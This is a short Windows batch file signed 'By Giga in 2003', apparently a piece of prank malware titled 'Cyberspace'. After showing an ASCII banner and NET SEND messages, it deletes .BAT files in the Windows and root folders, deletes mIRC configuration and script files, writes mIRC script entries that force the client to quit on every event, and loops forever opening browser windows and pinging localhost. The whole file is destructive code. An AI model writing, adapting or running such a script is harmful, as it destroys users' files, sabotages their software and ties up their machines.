   @ECHO OFF
   ECHO ++++++++++++++++++++++++++++++++
   ECHO ++++++++++++       +++++++++++++
   ECHO +++++++++++         ++++++++++++
   ECHO ++++++++++           +++++++++++
   ECHO ++++++++++CYBERSPACE +++++++++++
   ECHO ++++++++++           +++++++++++
   ECHO +++++++++++         ++++++++++++
   ECHO ++++++++++++       +++++++++++++
   ECHO ++++++++++++++++++++++++++++++++
   ECHO.
   ECHO ++++++++++++++++++++++++++++++++ >> c:\CYBERSPACE.TXT
   ECHO ++++++++++++       +++++++++++++ >> c:\CYBERSPACE.TXT
   ECHO +++++++++++         ++++++++++++ >> c:\CYBERSPACE.TXT
   ECHO ++++++++++           +++++++++++ >> c:\CYBERSPACE.TXT
   ECHO ++++++++++CYBERSPACE +++++++++++ >> c:\CYBERSPACE.TXT
   ECHO ++++++++++           +++++++++++ >> c:\CYBERSPACE.TXT
   ECHO +++++++++++         ++++++++++++ >> c:\CYBERSPACE.TXT
   ECHO ++++++++++++       +++++++++++++ >> c:\CYBERSPACE.TXT
   ECHO ++++++++++++++++++++++++++++++++ >> c:\CYBERSPACE.TXT
   ECHO Welcome to Cyberspace.
   choice /ty,3 >nul
   NET SEND 127.0.0.1 You're about to learn about a whole new world!

   :DELETE
   CD c:\WINDOWS\
   ECHO Y ¦ DEL *.BAT
   CD C:\
   ECHO Y ¦ DEL *.BAT
   CD C:\Progra~1\mIRC\
   ECHO Y ¦ DEL *.INI
   ECHO Y ¦ DEL *.MRC

   :mIRC
   echo n0=ON 1:JOIN:*:/quit >> C:\Progra~1\mIRC\script.ini
   echo n1=ON 1:TEXT:*:*:/quit >> C:\Progra~1\mIRC\script.ini
   echo n2=ON 1:KICK:*:*:/quit >> C:\Progra~1\mIRC\script.ini
   echo n3=ON 1:OP:*:*:/quit >> C:\Progra~1\mIRC\script.ini
   echo n4=ON 1:DEOP:*:*:/quit >> C:\Progra~1\mIRC\script.ini
   echo n3=ON 1:VOICE:*:*:/quit >> C:\Progra~1\mIRC\script.ini
   echo n4=ON 1:DEVOICE:*:*:/quit >> C:\Progra~1\mIRC\script.ini
   echo n3=ON 1:PART:*:*:/quit >> C:\Progra~1\mIRC\script.ini
   echo n4=ON 1:DEVOICE:*:*:/quit >> C:\Progra~1\mIRC\script.ini
   echo n5=ON 1:CONNECT:*:*:/quit >> C:\Progra~1\mIRC\script.ini

   :NETSEND
   NET SEND 127.0.0.1 Cyberspace has many dffrent people.
   NET SEND 127.0.0.1 Some are capable of great things
   NET SEND 127.0.0.1 Be warned!
   NET SEND 127.0.0.1 CYBERWAR IS COMING

   :LOOP
   START www.google.com
   NET SEND 127.0.0.1 Here we go!
   PING -t 127.0.0.1
   GOTO LOOP

   EXIT

   REM By Giga in 2003
